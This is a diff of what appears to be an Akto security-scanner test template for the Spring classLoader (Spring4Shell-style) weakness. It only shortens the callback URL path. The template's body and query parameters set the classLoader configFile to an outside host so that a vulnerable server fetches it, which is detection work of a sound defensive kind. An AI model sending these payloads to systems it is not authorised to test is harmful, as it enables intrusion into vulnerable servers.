@@ -43,7 +43,7 @@ execute:
           content-type: "application/x-www-form-urlencoded"
       - send_ssrf_req:
           url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - replace_body: 'class.module.classLoader.resources.context.configFile="https://test-services.akto.io/store_uuid/${random_uuid}"&class.module.classLoader.resources.context.configFile.content.aaa=xxx'
+      - replace_body: 'class.module.classLoader.resources.context.configFile="https://test-services.akto.io/${random_uuid}"&class.module.classLoader.resources.context.configFile.content.aaa=xxx'
       - validate:
           response_code:
             gt: 505
@@ -55,7 +55,7 @@ execute:
       - send_ssrf_req:
           url: "https://test-services.akto.io/store_uuid/${random_uuid}"
       - add_query_param:
-          "class.module.classLoader.resources.context.configFile": "https://test-services.akto.io/store_uuid/${random_uuid}"
+          "class.module.classLoader.resources.context.configFile": "https://test-services.akto.io/${random_uuid}"
       - add_query_param:
           "class.module.classLoader.resources.context.configFile.content.aaa": "xxx"
       - validate:
